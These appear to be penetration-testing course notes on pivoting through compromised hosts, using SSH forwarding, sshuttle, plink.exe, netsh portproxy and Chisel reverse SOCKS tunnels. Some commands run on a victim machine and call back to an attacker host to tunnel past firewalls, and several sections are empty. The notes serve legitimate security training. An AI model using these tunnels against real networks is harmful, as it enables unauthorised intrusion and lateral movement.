# Port Redirection and Tunneling

## Table of Contents
- [Port Forwarding](#port-forwarding)
  - [RINETD](#rinetd)
- [SSH Tunneling](#ssh-tunneling)
  - [SSH Local Port Forwarding](#ssh-local-port-forwarding)
  - [SSH Remote Port Forwarding](#ssh-remote-port-forwarding)
  - [SSH Dynamic Port Forwarding](#ssh-dynamic-port-forwarding) 
  - [SSHuttle](#sshuttle)
- [PLINK.exe](#plink.exe)
- [NETSH](#netsh)
- [HTTPTunnel-ing Through Deep Packet Inspection](#httptunnel-ing-through-deep-packet-inspection)
- [Static-Toolbox](#static-toolbox)

## Port Forwarding
Port forwarding is the simplest traffic manipulation technique in which we redirect traffic destined for one IP address and port to another IP address and port.

### RINETD

## SSH Tunneling
### SSH Local Port Forwarding
*SSH local port forwarding* allows us to tunnel a local port to a remote server using SSH as the transport protocol. 

During an assessment, we have compromised a Linux-based target through a remote vulnerability, elevated our privileges to root, and gained access to the passwords for both the root and student users on the machine. This compromised machine does not appear to have any outbound traffic filtering, and it only exposes SSH (port 22), RDP (port 3389), and the vulnerable service port(8080), which are also allowed on the firewall.
After enumerating the compromised Linux client, we discover that in addition to being connected to the current network (10.11.0.x), it has another network interface that seems to be connected to a different network (192.168.1.x). In this internal subnet, we identify a Windows Server 2016 machine that has network shares available.

We want to interact with this new target from our Internet-based Kali attack machine, pivoting through this compromised Linux client. This way, we will have access to all of the tools on our Kali attack machine as we interact with the target.

Command prototype for local port forwarding using SSH:
```sh
ssh -N -L [bind_address:]port:host:hostport [username@address]
```
In our scenario, we want to forward port 445 (Microsoft networking without NetBIOS) on our Kali machine to port 445 on the Windows Server 2016 target. When we do this, any Microsoft file sharing queries directed at our Kali machine will be forwarded to our Windows Server 2016 target.

This seems impossible given that the firewall is blocking traffic on TCP port 445, but this port forward is tunneled through an SSH session to our Linux target on port 22, which is allowed through the firewall. In summary, the request will hit our Kali machine on port 445, will be forwarded across the SSH session, and will then be passed on to port 445 on the Windows Server 2016 target.

At this point, any incoming connection on the Kali Linux box on TCP port 445 will be forwarded to TCP port 445 on the 192.168.1.110 IP address through our compromised Linux client.

Updating SAMBA from SMBv1 to SMBv2 communications because Windows Server 2016 no longer supports SMBv1 by default.
```sh
kali@kali:~$ sudo nano /etc/samba/smb.conf 

kali@kali:~$ cat /etc/samba/smb.conf 
...
Please note that you also need to set appropriate Unix permissions
# to the drivers directory for these users to have write rights in it
;   write list = root, @lpadmin

min protocol = SMB2

kali@kali:~$ sudo /etc/init.d/smbd restart
[ ok ] Restarting smbd (via systemctl): smbd.service.
```

List the remote shares on the Windows Server 2016 machine by pointing the request at our Kali machine.
We will use the smbclient utility, supplying the IP address or NetBIOS name, in this case our local machine (-L 127.0.0.1) and the remote user name (-U Administrator). If everything goes according to plan, after we enter the remote password, all the traffic on that port will be redirected to the Windows machine and we will be presented with the available shares:
```
kali@kali:~# smbclient -L 127.0.0.1 -U Administrator
```

### SSH Remote Port Forwarding
The *remote port forwarding* feature in SSH can be thought of as the reverse of local port forwarding, in that a port is opened on the *remote* side of the connection and traffic sent to that port is forwarded to a port on our *local* machine (the machine initiating the SSH client).


### SSH Dynamic Port Forwarding
*Dynamic Port Forwarding* allows to set a local listening port and have it tunnel incoming traffic to any remote destination through the use of a proxy.

0. Command prototype for dynamic port forwarding using SSH:
    ```sh
    ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>
    ```

1. We can create a local SOCKS4 application proxy (`-N -D`) on our Kali Linux machine on TCP port `8080` (`127.0.0.1:8080`), which will tunnel all incoming traffic to any host in the target network, through the compromised Linux machine, which we log into as student (`student@10.11.0.128`):
    ```sh
    kali@kali:~$ sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128
    ```
2. Adding our SOCKS4 proxy to the ProxyChains configuration file
    ```sh
    kali@kali:~$ cat /etc/proxychains4.conf
    ...

    [ProxyList]
    # add proxy here ...
    # meanwile
    # defaults set to "tor"
    # socks4 	127.0.0.1 9050
    socks4 	127.0.0.1 8080 
    ```
3. Using nmap to scan a machine through a dynamic tunnel
    ```sh
    kali@kali:~$ sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110
    ```

**Note**: To have this work also on Firefox you can setup a Proxy on FoxyProxy (reflecting `/etc/proxychains4.conf`):
- *Proxy Type*: SOCKS4
- *Proxy IP address or DNS name*: 127.0.0.1
- *Port*: 8080

### SSHuttle
A great alternative to SSH Dynamic port forwarding.
- Install instructions:
    ```
    kali@kali:~$ sudo apt-get install sshuttle
    ```
- Usage:
    ```
    kali@kali:~$ sshuttle -r sean@10.11.1.251 10.1.1.0/24
    ```
#### SSHuttle-legacy
If the destination box hasn't python3 then you need a [legacy version of sshuttle](https://github.com/sshuttle/sshuttle/issues/328#issuecomment-657790878):
```
mkvirtualenv sshuttle-legacy
pip install sshuttle==0.78.5
ln -s ~/.virtualenvs/sshuttle-legacy/bin/sshuttle /usr/local/bin/sshuttle-legacy
```
Then you can directly use **`sudo sshuttle-legacy`**:
```sh
sudo sshuttle-legacy -e 'ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-rsa' -r j0hn@10.11.1.252:22000 10.2.2.0/24
```
## PLINK.exe
Performs port forwarding and tunneling on Windows-based operating systems.

0. Assume that we have gained access to a Windows 10 machine during our assessment through a vulnerability and have obtained a SYSTEM-level reverse shell.
1. During the enumeration and information gathering process, we discover a MySQL service running on TCP port 3306.
    ```cmd
    C:\Windows\system32>netstat -anpb TCP
    ...
      TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING
     [mysqld.exe]
    ```
2. To scan this database or interact with the service (regardless of the firewall) we will transfer plink.exe, a Windows-based command line SSH client to the target. => Non-interactive FTP will work.

3. use **plink.exe** to connect via SSH (**`-ssh`**) to our Kali machine  as the kali user (**`-l kali`**) with a password (**`-pw ilak`**) to create a remote port forward (**`-R`**) of port `1234` (`$kali_IP:1234`) to the MySQL port on the Windows target (`127.0.0.1:3306`)
    ```cmd
    C:\Tools\port_redirection_and_tunneling> plink.exe -ssh -l kali -pw ilak -R $kali_IP:1234:127.0.0.1:3306 $kali_IP
    ```

*Note*: The first time plink connects to a host, it will attempt to cache the host key in the registry (an interactive step). 

4. Establishing a remote tunnel using plink.exe without requiring interaction
    ```cmd
    C:\Tools\port_redirection_and_tunneling> cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
    ```
5. Now that our tunnel is active, we can attempt to launch an Nmap scan of the target's MySQL port via our localhost port forward on TCP port 1234:
    ```sh
    kali@kali:~$ sudo nmap -sS -sV 127.0.0.1 -p 1234
    ```
## NETSH
- We have compromised a Windows 10 target through a remote vulnerability and were able to successfully elevate our privileges to SYSTEM. 
- After enumerating the compromised machine, we discover that in addition to being connected to the current network (10.11.0.x), it has an additional network interface that seems to be connected to a different network (192.168.1.x). 
- In this internal subnet, we identify a Windows Server 2016 machine (192.168.1.110) that has TCP port 445 open.

Because of our privilege level, we do not have to deal with User Account Control (UAC), which means we can use the [netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) utility (installed by default on every modern version of Windows) for port forwarding and pivoting.
However, for this to work, the Windows system must have the *IP Helper* service running and *IPv6 support* must be enabled for the interface we want to use. Fortunately, both are on and enabled by default on Windows operating systems.

Local port forwarding using netsh to redirect traffic destined for the compromised Windows 10 machine on TCP port 4455 (listenaddress=10.11.0.22 listenport=4455) to the Windows Server 2016 machine on port 445 (onnectport=445 connectaddress=192.168.1.110):
```cmd
C:\Windows\system32> netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
```


## HTTPTunnel-ing Through Deep Packet Inspection
Chisel
> **Note**:
> chisel is cross-platform and the releases can be found [here](https://github.com/jpillora/chisel/releases/tag/v1.8.1). Eg take the chisel_1.8.1_linux_amd64.gz and chisel_1.8.1_windows_amd64.gz ones and gunzip them.
- Server (@Kali)
    ```sh
    ./chisel_1.8.1_linux_amd64 server --port 8000 --reverse --socks5
    2023/04/28 05:15:11 server: Reverse tunnelling enabled
    2023/04/28 05:15:11 server: Fingerprint A46XJ7LeFxYqW2gGowc64NV58i3TI0Q5Q/GCv5B4edM=
    2023/04/28 05:15:11 server: Listening on http://0.0.0.0:8000
    2023/04/28 05:15:25 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
    ```
- Client (@Victim)
    ```powershell
    C:\Windows\Tasks>.\chisel_1.8.1_windows_amd64.exe client --max-retry-count 1 192.168.119.133:8000 R:socks
    .\chisel_1.8.1_windows_amd64.exe client --max-retry-count 1 192.168.119.133:8000 R:socks
    ```
- Edit the `/etc/proxychains4.conf` file to contain at the bottom:
    ```conf
    # Chisel
    # 1080 is the default port of the Chisel reverse proxy
    socks5 127.0.0.1 1080
    ```
> **Note**:
> Apparently you can't ping through proxychains (https://superuser.com/questions/442995/is-ping-not-supposed-to-work-via-proxychains), try to do a nmap scan to some common ports to see if your setup works.  
> If you do a nmap scan as sudo, it defaults to syn scan (`-sS`) that won't work through SOCKS. Either do it without sudo or use the `-sT` flag.

Ref: [OSCP - Pivoting with Chisel](https://blog.mkiesel.ch/posts/oscp_pivoting/)
### Static-Toolbox
On the pivot machine it's better to install a statically compiled Nmap version and scan from there. Because Nmap is incompatible w/ sshuttle and is veeery slow w/ DPF.

- Instructions to download:
  ```sh
  ```
